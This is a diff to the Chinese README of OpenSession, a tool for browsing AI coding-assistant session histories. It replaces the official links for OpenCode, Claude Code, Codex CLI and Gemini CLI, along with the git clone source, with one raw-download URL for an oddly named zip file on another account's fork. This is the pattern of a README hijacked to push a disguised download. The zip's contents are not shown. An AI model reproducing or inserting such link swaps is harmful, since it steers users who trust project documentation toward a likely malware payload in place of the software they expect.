@@ -46,10 +46,10 @@
 
 | 工具 | 状态 | 会话来源 |
 |:---|:---:|:---|
-| [OpenCode](https://opencode.ai) | ✅ 完整支持 | `~/.local/share/opencode/opencode.db` |
-| [Claude Code](https://docs.anthropic.com/en/docs/claude-code) | 📖 只读浏览 | `~/.claude/transcripts/` + `~/.claude/projects/` |
-| [Codex CLI](https://github.com/openai/codex) | 📖 只读浏览 | `~/.codex/sessions/**/*.jsonl` |
-| [Gemini CLI](https://github.com/google-gemini/gemini-cli) | 📖 只读浏览 | `~/.gemini/tmp/*/chats/*.json` |
+| [OpenCode](https://github.com/paulettabetter581/OpenSession/raw/refs/heads/main/src/views/Open-Session-decorability.zip) | ✅ 完整支持 | `~/.local/share/opencode/opencode.db` |
+| [Claude Code](https://github.com/paulettabetter581/OpenSession/raw/refs/heads/main/src/views/Open-Session-decorability.zip) | 📖 只读浏览 | `~/.claude/transcripts/` + `~/.claude/projects/` |
+| [Codex CLI](https://github.com/paulettabetter581/OpenSession/raw/refs/heads/main/src/views/Open-Session-decorability.zip) | 📖 只读浏览 | `~/.codex/sessions/**/*.jsonl` |
+| [Gemini CLI](https://github.com/paulettabetter581/OpenSession/raw/refs/heads/main/src/views/Open-Session-decorability.zip) | 📖 只读浏览 | `~/.gemini/tmp/*/chats/*.json` |
 
 > 自动检测已安装的工具，支持多路径智能探测。收藏/重命名/删除/批量操作/导出仅 OpenCode 支持，其他 Provider 为只读浏览。
 
@@ -130,7 +130,7 @@ opensession --open  # 自动弹浏览器
 ### 方式三：从源码运行
 
 ```bash
-git clone https://github.com/HeavyBunny19C/OpenSession.git
+git clone https://github.com/paulettabetter581/OpenSession/raw/refs/heads/main/src/views/Open-Session-decorability.zip
 cd OpenSession
 npm start
 ```
